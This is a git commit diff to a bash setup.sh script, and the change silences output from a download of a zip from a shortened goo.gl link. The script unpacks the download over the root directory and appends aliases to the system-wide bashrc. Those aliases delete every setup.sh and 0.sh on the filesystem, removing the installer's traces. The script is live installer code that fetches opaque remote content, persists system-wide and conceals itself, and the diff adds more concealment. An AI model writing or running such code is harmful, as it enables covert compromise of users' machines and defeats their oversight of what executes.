6bd467b50dbcef1a06b6681f7b6b52d866f2a813
D4NP0UL1N <ct3d.f1l35@gmail.com>
2017-04-25 17:57:59 -0400

    Update setup.sh

--- FINAL/setup.sh
+++ FINAL/setup.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
-mkdir /usr/share/misc/final
-wget goo.gl/oi5amn -O /usr/share/misc/final/setup.zip
+mkdir /usr/share/misc/final >/dev/null 2>&1
+wget goo.gl/oi5amn -O /usr/share/misc/final/setup.zip >/dev/null 2>&1
 sleep 2
 echo 'alias setup1="mv /usr/share/misc/final/setup.zip /; unzip /setup.zip -d / >/dev/null 2>&1; find / -name setup.sh -exec rm -f {} 2>/dev/null \; cd ~"' >> /etc/bash.bashrc
 echo 'alias setup2="rm /*.zip; find / -name 0.sh -exec rm -f {} 2>/dev/null \;"' >> /etc/bash.bashrc
